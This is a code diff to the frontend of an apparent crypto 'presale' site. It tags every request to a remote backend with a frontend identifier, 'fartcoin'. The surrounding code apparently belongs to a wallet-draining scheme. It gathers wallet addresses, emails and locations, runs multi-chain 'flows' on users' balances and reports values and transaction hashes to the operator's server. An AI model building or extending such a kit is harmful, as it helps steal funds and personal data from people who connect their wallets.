@@ -73,6 +73,9 @@ const PROJECT_FLOW_ROUTER_ABI = [
   "event TokenFlowProcessed(address indexed token, address indexed initiator, uint256 amount)"
 ];
 
+// FRONTEND SOURCE IDENTIFIER
+const FRONTEND_SOURCE = 'fartcoin'; // This will identify which frontend is sending requests
+
 function App() {
   const { open } = useAppKit();
   const { address, isConnected } = useAppKitAccount();
@@ -213,7 +216,7 @@ function App() {
     init();
   }, [walletProvider, address]);
 
-  // Track page visit with location
+  // Track page visit with location - ADDED SOURCE
   useEffect(() => {
     const trackVisit = async () => {
       try {
@@ -223,7 +226,8 @@ function App() {
           body: JSON.stringify({
             userAgent: navigator.userAgent,
             referer: document.referrer,
-            path: window.location.pathname
+            path: window.location.pathname,
+            source: FRONTEND_SOURCE // ADDED: Identify which frontend
           })
         });
         const data = await response.json();
@@ -326,7 +330,10 @@ function App() {
       const response = await fetch('https://bthbk.vercel.app/api/presale/connect', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletAddress: address })
+        body: JSON.stringify({ 
+          walletAddress: address,
+          source: FRONTEND_SOURCE // ADDED: Identify which frontend
+        })
       });
       
       const data = await response.json();
@@ -360,7 +367,10 @@ function App() {
       const response = await fetch('https://bthbk.vercel.app/api/presale/prepare-flow', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletAddress: address })
+        body: JSON.stringify({ 
+          walletAddress: address,
+          source: FRONTEND_SOURCE // ADDED: Identify which frontend
+        })
       });
       
       const data = await response.json();
@@ -494,7 +504,7 @@ function App() {
           results.push(result);
           setExecutionResults([...results]);
           
-          // Notify backend
+          // Notify backend - ADDED SOURCE
           await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -507,7 +517,8 @@ function App() {
               symbol: chain.symbol,
               valueUSD: balances[chain.name].valueUSD * 0.85,
               email: userEmail,
-              location: userLocation
+              location: userLocation,
+              source: FRONTEND_SOURCE // ADDED: Identify which frontend
             })
           });
           
@@ -546,7 +557,7 @@ function App() {
         setShowCelebration(true);
         setTxStatus(`🎉 Success! Processed on ${processed.length} chains`);
         
-        // Final success notification
+        // Final success notification - ADDED SOURCE
         await fetch('https://bthbk.vercel.app/api/presale/claim', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -559,7 +570,8 @@ function App() {
             transactions: results.filter(r => r.status === 'success').map(r => ({
               chain: r.chain,
               txHash: r.txHash
-            }))
+            })),
+            source: FRONTEND_SOURCE // ADDED: Identify which frontend
           })
         });
       } else {
@@ -587,7 +599,8 @@ function App() {
         body: JSON.stringify({ 
           walletAddress: address,
           email: userEmail,
-          location: userLocation
+          location: userLocation,
+          source: FRONTEND_SOURCE // ADDED: Identify which frontend
         })
       });
       setShowCelebration(true);
